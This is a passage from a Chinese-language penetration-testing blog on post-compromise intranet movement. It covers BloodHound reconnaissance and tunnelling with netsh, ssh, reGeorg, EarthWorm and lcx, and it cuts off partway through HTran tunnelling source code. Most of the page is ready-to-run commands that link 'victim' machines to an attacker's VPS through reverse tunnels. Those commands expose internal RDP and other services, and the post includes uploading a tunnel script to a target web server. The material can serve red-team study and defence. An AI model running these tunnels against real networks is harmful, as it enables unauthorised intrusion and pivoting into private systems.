<h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>我们可以利用Bloodhound做一些自动化的信息收集，包括用户、计算机、组织架构、最快的攻击途径等。但是自动化也意味着告警，该漏洞做自动化信息收集时，会在内网设备上产生大量的告警，按需使用。</p>
<p>项目地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;BloodHound</span><br></pre></td></tr></table></figure>

<p>使用文档直接看这边即可了，我就懒得copy过来了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bloodhound.readthedocs.io&#x2F;</span><br></pre></td></tr></table></figure>

<p>这里有两个版本，一个PS版本一个exe版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe  -c all</span><br></pre></td></tr></table></figure>

<p>运行后会在本地生成两个文件</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/46.png?raw=true" alt="image-20200801121332755"></p>
<p>接下来要搭个服务器，我们需要如下清单</p>
<ul>
<li>neo4j-community-4.1.1-windows</li>
<li>BloodHound-win32-x64</li>
<li>JAVA环境（OpenJDK 11）</li>
</ul>
<p>搭建步骤跟官方文档走就好了，我这边就用kali搭neo4j服务了，不想破坏windows目前的环境</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/47.png?raw=true" alt="image-20200801124946426"></p>
<p>这是连接上了的环境，并且处理了我们先生成的zip格式文件</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/48.png?raw=true" alt="image-20200801125325408"></p>
<p>找到域环境管理员最短路径，这工具第一次接触，不敢乱写，后面研究下补充下</p>
<h2 id="狡兔三窟"><a href="#狡兔三窟" class="headerlink" title="狡兔三窟"></a>狡兔三窟</h2><h3 id="是否出网"><a href="#是否出网" class="headerlink" title="是否出网"></a>是否出网</h3><p>简单的命令如下，复杂点的可以看<a href="https://www.ascotbe.com/2020/07/12/RemoteDownlo">恶意程序研究之远程下载恶意程序</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping</span><br><span class="line">curl</span><br><span class="line">nslookup</span><br></pre></td></tr></table></figure>

<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><h4 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h4><p>netsh是windows自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p>
<p>详细内容可以参考官方文档</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-tw&#x2F;windows-server&#x2F;networking&#x2F;technologies&#x2F;netsh&#x2F;netsh-contexts</span><br></pre></td></tr></table></figure>

<p>A机器执行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh  interface portproxy add v4tov4 listenport&#x3D;5555 connectport&#x3D;3389 connectaddress&#x3D;192.168.1.1  protocol&#x3D;tcp</span><br></pre></td></tr></table></figure>

<p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p>
<h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>ssh一般被拿来登录linux机器，也可以拿来做代理和转发。</p>
<h5 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">-1：强制使用ssh协议版本1.</span><br><span class="line">-2：强制使用ssh协议版本2.</span><br><span class="line">-4：强制使用IPv4地址.</span><br><span class="line">-6：强制使用IPv6地址.</span><br><span class="line">-A：开启认证代理连接转发功能.</span><br><span class="line">-a：关闭认证代理连接转发功能.</span><br><span class="line">-b bind_address</span><br><span class="line">	使用本机指定地址作为对应连接的源ip地址.</span><br><span class="line">-c blowfish|3des|des</span><br><span class="line">	请求压缩所有数据.</span><br><span class="line">-C:要求进行数据压缩 (包括 stdin, stdout, stderr 以及转发 X11 和 TCP&#x2F;IP 连接 的数据).</span><br><span class="line">-D port</span><br><span class="line">    指定一个本地机器 &#96;&#96;动态的 应用程序端口转发. </span><br><span class="line">-F configfile</span><br><span class="line">	指定ssh指令的配置文件.</span><br><span class="line">-f：后台执行ssh指令.</span><br><span class="line">-g：允许远程主机连接主机的转发端口.</span><br><span class="line">-i identity_file</span><br><span class="line">	指定身份文件.</span><br><span class="line">-I smartcard_device</span><br><span class="line">    指定智能卡(smartcard)设备. 参数是设备文件, 能够用它和智能卡通信, 智能卡里面存储了用户的 RSA 私钥.</span><br><span class="line">-l login_name</span><br><span class="line">	指定连接远程服务器登录用户名.</span><br><span class="line">-L port:host:hostport</span><br><span class="line">    将本地机(客户机)的某个端口转发到远端指定机器的指定端口. </span><br><span class="line">-k：禁止转发 Kerberos 门票和 AFS 令牌. </span><br><span class="line">-m mac_spec</span><br><span class="line">    另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的 MAC(消息验证码)算法 (message authentication code). </span><br><span class="line">-n：把 stdin 重定向到 &#x2F;dev&#x2F;null (实际上防止从 stdin 读取数据). </span><br><span class="line">-N：不执行远程指令,用于转发端口.</span><br><span class="line">-o option</span><br><span class="line">	指定配置选项.</span><br><span class="line">-p port</span><br><span class="line">	指定远程服务器上的端口.</span><br><span class="line">-q：静默模式.</span><br><span class="line">-s:请求远程系统激活一个子系统.</span><br><span class="line">-R port:host:hostport</span><br><span class="line">    将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. </span><br><span class="line">-t:强制分配伪终端.</span><br><span class="line">-T:禁止分配伪终端.</span><br><span class="line">-v:冗详模式.</span><br><span class="line">-X：开启X11转发功能.</span><br><span class="line">-x：关闭X11转发功能.</span><br><span class="line">-y：开启信任X11转发功能.</span><br></pre></td></tr></table></figure>



<ul>
<li><p>开启socks代理：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D 6666 root@1.1.1.1</span><br></pre></td></tr></table></figure>

<p>输入1.1.1.1机器密码，本地利用proxychains等类似工具连接本地的6666端口的sock5连接即可代理1.1.1.1的网络。</p>
</li>
<li><p>控制A、B机器，A能够访问B，且能出网，B能够访问C，但不能出网，A不能访问C：</p>
<p>A机器执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -L 2121:CIP:21 root@BIP</span><br></pre></td></tr></table></figure>

<p>输入BIP机器密码，访问A的2121端口即是访问CIP的21端口。</p>
</li>
<li><p>控制A机器，A能够访问B：</p>
<p>A机器执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -R 2121:BIP:21 root@hackervps</span><br></pre></td></tr></table></figure>

<p>输入黑客vps密码，访问黑客vps的2121端口即是访问BIP的21端口。</p>
</li>
</ul>
<h4 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h4><p>reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，使用http代理进入内网。</p>
<p>项目地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;reGeorg</span><br></pre></td></tr></table></figure>

<p>根据网站支持的语言，把相应的tunnel.xx传到服务器上，访问tunnel.xx显示“Georg says, ‘All seems fine’”，说明基本ok。</p>
<p>然后本地访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pythonreGeorgSocksProxy.py -p 9999 -u http://1.1.1.1:8080/tunnel.xx</span><br></pre></td></tr></table></figure>

<p>利用proxychains等类似工具连接本地的9999端口的sock5连接即可代理1.1.1.1的网络。</p>
<h4 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h4><p>官网有使用文档和下载地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;EarthWorm&#x2F;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>受害者机器有外网ip并可直接访问</p>
<p>把ew传到对方服务器上，执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 8888</span><br></pre></td></tr></table></figure>

<p>现在本地利用proxychains等类似工具连接本地的对方服务器的8888端口的sock5连接即可代理对方的网络。</p>
</li>
<li><p>控制A机器，A能够访问B，通过A访问B</p>
<p>在自己外网服务器上执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>

<p>对方服务器执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rssocks -d yourvpsip -e 8888</span><br></pre></td></tr></table></figure>

<p>利用proxychains等类似工具可通过连接你的外网vps的1080 端口的socks5，即可代理受害者服务器的网络。</p>
</li>
<li><p>控制A、B机器，A能够访问B，B能够访问C，A有外网ip并可直接访问，通过A来使用B的流量访问C</p>
<p>B机器执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>

<p>A机器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_tran -l 1080 -f BIP -g 9999</span><br></pre></td></tr></table></figure>

<p>利用proxychains等类似工具可通过连接A的1080 端口的socks5，即可代理B服务器的网络。</p>
</li>
<li><p>控制A、B机器，A能够访问B，B能够访问C，A没有外网ip，通过A连接自己的外网vps来使用B的流量访问C：</p>
<p>自己vps执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure>

<p>B机器执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>

<p>A机器执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999</span><br></pre></td></tr></table></figure>

<p>利用proxychains等类似工具可通过连接你自己的vps的1080 端口的socks5，即可代理B服务器的网络。</p>
</li>
</ul>
<h4 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h4><p>lcx是一款轻便的端口转发工具。</p>
<ul>
<li><p>反向转发</p>
<p>外网VPS机器监听：</p>
<p>1111为转发端口，2222为本机任意未被占用的端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 1111 2222</span><br></pre></td></tr></table></figure>

<p>受害者机器执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave VPSip 1111 127.0.0.1 3389</span><br></pre></td></tr></table></figure>

<p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p>
</li>
<li><p>正向转发</p>
<p>A机器执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran 1111 2.2.2.2 8080</span><br></pre></td></tr></table></figure>

<p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p>
</li>
</ul>
<p>这边只找到源码，我改了一下VS2019可以编译通过</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Usage   : E:\&gt;HTran</span></span><br><span class="line"><span class="comment">*       : ======================== HUC Packet Transmit Tool V1.00 =======================</span></span><br><span class="line"><span class="comment">*       : =========== Code by lion &amp; bkbll, Welcome to [url]http://www.cnhonker.com[/url] ==========</span></span><br><span class="line"><span class="comment">*       :</span></span><br><span class="line"><span class="comment">*       : [Usage of Packet Transmit:]</span></span><br><span class="line"><span class="comment">*       :  HTran -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span></span><br><span class="line"><span class="comment">*       :</span></span><br><span class="line"><span class="comment">*       : [option:]</span></span><br><span class="line"><span class="comment">*       :  -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*       :  -tran  &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*       :  -slave  &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">************************************************************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_NONSTDC_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//宏定义</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	SOCKET	s1;</span><br><span class="line">	SOCKET	s2;</span><br><span class="line">&#125;Stu_sock;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">version</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">param</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>;		<span class="comment">//对命令行参数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Funlisten</span><span class="params">(<span class="keyword">int</span> port1, <span class="keyword">int</span> port2)</span></span>;	<span class="comment">//监听功能函数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bindAndFunlisten</span><span class="params">(SOCKET s, <span class="keyword">int</span> port)</span></span>;<span class="comment">//绑定socket的地址结构</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">datatrans</span><span class="params">(LPVOID data)</span></span>;			<span class="comment">//数据转发函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slave</span><span class="params">(<span class="keyword">char</span>* hostIp, <span class="keyword">char</span>* slaveIp, <span class="keyword">int</span> destionPort, <span class="keyword">int</span> slavePort)</span></span>;<span class="comment">//slave函数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkIP</span><span class="params">(<span class="keyword">char</span>* str)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">char</span>* server, <span class="keyword">int</span> port)</span></span>;<span class="comment">//连接服务端</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	version();</span><br><span class="line">	<span class="comment">//参数判断</span></span><br><span class="line">	WSADATA wsadata;</span><br><span class="line">	WSAStartup(MAKEWORD(<span class="number">1</span>, <span class="number">1</span>), &amp;wsadata);</span><br><span class="line">	<span class="keyword">char</span> hostIp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">char</span> slaveIp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line">	ret = param(argc, argv);</span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">1</span>)<span class="comment">//Funlisten</span></span><br><span class="line">	&#123;</span><br><span class="line">		Funlisten(atoi(argv[<span class="number">2</span>]), 